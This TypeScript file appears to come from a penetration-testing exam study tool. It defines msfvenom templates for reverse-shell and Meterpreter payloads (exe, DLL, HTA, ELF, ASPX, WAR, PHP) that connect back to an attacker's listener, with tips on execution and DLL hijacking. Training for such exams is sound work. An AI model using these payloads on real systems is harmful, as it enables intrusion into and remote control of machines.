import type { PayloadDef, PayloadPart } from "./types";

/**
 * msfvenom runs on Kali, so every def is pasted at a bash prompt; `os` is the TARGET the file is for.
 * Staged, stageless and Meterpreter payloads. Nothing is banned on the exam; Meterpreter is limited to one machine (msfLock.ts).
 */
const NO_HANDLER = "Catch it with penelope, or nc; no multi/handler needed for stageless shell.";
const NEEDS_HANDLER = "Catch it with multi/handler: nc and penelope can't serve a stage or speak Meterpreter.";
const ARCH_NOTE = "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.";

const STAGED = "A slash before the last part (shell/reverse_tcp) means staged: the file is a small stager that fetches the rest, so only multi/handler can catch it.";
const STAGELESS = "An underscore (shell_reverse_tcp) means stageless: the whole shell is in the file, so nc or penelope can catch it.";
const METER_STAGELESS = "meterpreter_reverse_tcp (underscore) is stageless Meterpreter: the whole agent is in the file, bigger but one connection. Catch it with multi/handler.";
const METER_STAGED = "meterpreter/reverse_tcp (slash) is staged: the file is a small stager that pulls Meterpreter from multi/handler.";

function pExplain(payload: string): string {
  if (payload.includes("meterpreter_")) return METER_STAGELESS;
  if (payload.includes("meterpreter/")) return METER_STAGED;
  return /\/shell\//.test(payload) ? STAGED : STAGELESS;
}

function parts(payload: string, fmt: string, file: string, fmtExplain: string): PayloadPart[] {
  return [
    { token: "msfvenom", explain: "Metasploit's standalone payload generator. It only writes a file; Metasploit itself is not started." },
    { token: `-p ${payload}`, explain: `-p: the payload. ${pExplain(payload)}` },
    { token: "LHOST={LHOST}", explain: "Your listener's IP, baked into the file. Use the tun0 address and regenerate after any VPN reconnect." },
    { token: "LPORT={LPORT}", explain: "The port your listener waits on, baked into the file." },
    { token: `-f ${fmt}`, explain: fmtExplain },
    { token: "-o {FILE}", explain: `-o: where msfvenom writes the result. Without it the bytes go to stdout and wreck your terminal. FILE (default ${file}) is the name the target will see; for DLL hijacking name it exactly as the DLL being searched for.` },
  ];
}

function def(
  id: string, title: string, os: "linux" | "windows" | "any", payload: string, fmt: string, file: string,
  fmtExplain: string, notes: string[] = [], opts: { handlerOnly?: boolean; meterpreter?: boolean } = {},
): PayloadDef {
  return {
    id, generator: "msfvenom", title, os, contexts: ["bash-prompt"], requires: ["served-file"],
    template: `msfvenom -p ${payload} LHOST={LHOST} LPORT={LPORT} -f ${fmt} -o {FILE}`,
    parts: parts(payload, fmt, file, fmtExplain),
    listeners: opts.handlerOnly ? ["multi-handler"] : ["penelope", "multi-handler", "rlwrap-nc"],
    msfPayload: payload, bakesIp: true, defaults: { FILE: file },
    ...(opts.meterpreter ? { meterpreter: true } : {}),
    notes: [opts.handlerOnly ? NEEDS_HANDLER : NO_HANDLER, ...notes],
  };
}

const WIN64 = "windows/x64/shell_reverse_tcp";
const JAVA = "java/jsp_shell_reverse_tcp";
/** Tomcat names the app after the WAR file (rev.war → /rev/) unless the deploy gives its own path=. Confirmed by the owner's card. */
const WAR_NOTE = "Deploy through the Tomcat manager (or drop it in webapps/), then browse to /{FILE_STEM}/ to fire it: the app's path is the file name without .war, or the path= you deploy it with. The text deploy (/manager/text/deploy) needs a manager-script user.";
/** msfvenom's DLL template starts the payload from DllMain on load, so rundll32 fires it whatever export is named. */
const DLL_NOTE = "To run it by hand: rundll32 C:\\path\\to\\{FILE_NAME},x. The shell starts from DllMain when the DLL loads, so any export name works; rundll32 may then complain the entry point is missing, and the shell still runs.";
/** The x64 payload wants a 64-bit mshta; which one a double-click uses is unverified, so the note says to check. */
const HTA_NOTE = "Run it with the 64-bit mshta: C:\\Windows\\System32\\mshta.exe <path or URL of {FILE_NAME}>. C:\\Windows\\SysWOW64\\mshta.exe is 32-bit, and a double-click may use it (check the .hta association): if the shell never arrives, check which mshta ran it.";
const WAR_FMT = "-f war: a deployable Tomcat archive wrapping the JSP shell.";

export const MSFVENOM: PayloadDef[] = [
  def("msf-win-x64-exe", "Windows x64 exe", "windows", WIN64, "exe", "rev.exe",
    "-f exe: a Windows PE executable. For a service binary use exe-service instead, or the service dies with error 1053.", [ARCH_NOTE]),
  def("msf-win-x64-dll", "Windows x64 DLL", "windows", WIN64, "dll", "rev.dll",
    "-f dll: a Windows DLL for hijacking, or to run with rundll32. The host process must be x64 to load it.", [ARCH_NOTE, DLL_NOTE]),
  def("msf-win-x64-hta", "Windows x64 HTA", "windows", WIN64, "hta-psh", "rev.hta",
    "-f hta-psh: an HTML Application that launches the shell through PowerShell when opened with mshta.", [ARCH_NOTE, HTA_NOTE]),
  def("msf-win-x86-exe", "Windows x86 exe", "windows", "windows/shell_reverse_tcp", "exe", "rev32.exe",
    "-f exe: a Windows PE executable (32-bit here, so it also runs on x64 through WOW64).", ["x86 for Veil/Shellter"]),
  def("msf-linux-x64-elf", "Linux x64 ELF", "linux", "linux/x64/shell_reverse_tcp", "elf", "rev.elf",
    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE]),
  def("msf-win-x64-aspx", "Windows x64 ASPX", "windows", WIN64, "aspx", "rev.aspx",
    "-f aspx: an ASP.NET page that runs the shell when requested. Upload to an IIS site that executes .aspx.", [ARCH_NOTE]),
  // The same WAR runs on Tomcat on either OS, so it is one any-OS def (it never folds as "Wrong OS").
  def("msf-java-war", "Java WAR (Tomcat)", "any", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE]),

  def("msf-win-x64-met-staged", "Windows x64 Meterpreter (staged)", "windows", "windows/x64/meterpreter/reverse_tcp", "exe", "met.exe",
    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
  def("msf-win-x64-met-stageless", "Windows x64 Meterpreter (stageless)", "windows", "windows/x64/meterpreter_reverse_tcp", "exe", "met.exe",
    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
  def("msf-win-x64-shell-staged", "Windows x64 shell (staged)", "windows", "windows/x64/shell/reverse_tcp", "exe", "rev-staged.exe",
    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true }),
  def("msf-linux-x64-met-staged", "Linux x64 Meterpreter (staged)", "linux", "linux/x64/meterpreter/reverse_tcp", "elf", "met.elf",
    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
  def("msf-linux-x64-met-stageless", "Linux x64 Meterpreter (stageless)", "linux", "linux/x64/meterpreter_reverse_tcp", "elf", "met.elf",
    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
  def("msf-php-met", "PHP Meterpreter", "any", "php/meterpreter/reverse_tcp", "raw", "met.php",
    "-f raw: plain PHP source, no wrapper. Upload it to a PHP-executing path and request it.", [], { handlerOnly: true, meterpreter: true }),
];
